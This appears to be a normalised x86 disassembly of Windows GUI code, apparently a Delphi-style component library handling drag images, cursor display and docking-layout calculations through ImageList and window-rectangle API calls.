push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_45a384
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_45dcb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45dd08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ddc8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c634
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c634
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_45ddd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_462d14
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45de34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_463988
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_45de60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_462b40
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_45dd08
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45dec0
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_45ddd4
push 0x0
call ShowCursor
sub_45dec0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_462b40
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_45df24
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45dcb0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_45df24
push ebx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_45df48
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_45dcb0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45dfbc
push ebx
push esi
mov esi eax
mov eax esi
call sub_462b40
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_45df24
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_45de1c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_45e004
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_454628
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_45e060
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_45e0b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_42538c
xor eax eax
push ebp
push sub_45e14e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4257b8
xor eax eax
push ebp
push sub_45e12b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_454640
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e132
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4257b8
retn
sub_45e160
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_45e1f4
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_45e17c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45e1f4
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_45e7ec
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_45e1f4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_45e228
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45e2b8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov edx 0x2
call sub_45e2b8
jmp r-xdata
retn
sub_45e270
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45e324
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov edx 0x2
call sub_45e324
jmp r-xdata
retn
sub_45e2b8
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_45e6ec
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_45e324
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_45e1d8
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_45e6ec
push eax
mov eax esi
call sub_45e228
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_45e6ec
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_45e3d4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_45e1d8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_45e7ec
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_45e324
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_45e1d8
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_45e324
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_45e228
mov edx eax
add edx esi
mov eax ebx
call sub_45e714
mov edx edi
mov eax ebx
call sub_45e714
jmp r-xdata
mov eax ebx
call sub_45e574
mov eax ebx
call sub_45e7c4
mov ebx eax
test ebx ebx
jne r-xdata
sub_45e47c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f7c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fd0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_45e4c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4033e8
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_45e531
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_45674c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_45e544
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_45e7c4
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_45e574
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45e324
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45e324
mov esi eax
push ebp
call sub_45e544
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e7c4
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45e2b8
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45e2b8
mov ecx ebx
pop edx
call sub_417794
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45540c
mov eax [ ebp - 0x4 ]
call sub_45e6ec
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_45e6ec
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e6ec
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_45e6ec
push ebx
mov ebx eax
mov eax ebx
call sub_45e1f4
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_45e17c
test al al
je r-xdata
mov eax ebx
call sub_45e228
pop ebx
retn
sub_45e728
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45e714
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45e1c4
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_45e718
mov edx esi
call sub_45e728
sub_45e764
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45e6ec
mov edi eax
mov eax ebx
call sub_45e228
cmp edi eax
jl r-xdata
mov eax esi
call sub_45e3d4
mov eax [ esi + 0x1c ]
push eax
push sub_460274
mov edx esi
call sub_45eaa0
mov eax ebx
call sub_45e6ec
mov edi eax
mov eax esi
call sub_45e270
cmp edi eax
jle r-xdata
mov eax ebx
call sub_45e764
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_45e7d0
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_45e1f4
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_45e7f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031bc
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403550
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1a0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dcc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42c058
mov edx eax
mov eax ebx
call sub_424f48
mov eax [ ebp - 0x4 ]
call sub_45e9c8
xor eax eax
push ebp
push sub_45e904
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_45e3d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e90b
mov eax [ ebp - 0x4 ]
call sub_45e9cc
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_45903c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45e90b
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_46079c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_45e960
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_45f9cc
mov eax [ esi + 0x10 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_45e9e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_45e9e0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_45e9e0
pop ecx
sub_45ea38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_45e9e0
pop ecx
sub_45ea64
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45ea64
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45ea64
pop ecx
sub_45eab8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_45ea38
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_45e324
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_45e324
push eax
mov edx 0x1
mov eax ebx
call sub_45e2b8
push eax
mov edx 0x2
mov eax ebx
call sub_45e2b8
pop edx
pop ecx
call sub_417794
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402bf8
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45eb3c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_45e574
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_417794
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_45540c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1a0
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_45ea38
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_45e1c4
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_45fa64
mov edx esi
mov eax ebx
call sub_45ea38
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_4559f0
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1a0
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_4559dc
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_45e324
mov edx eax
mov eax edi
call sub_45e714
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_45e324
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_45e324
mov edx eax
mov eax edi
call sub_45e714
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_45e324
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
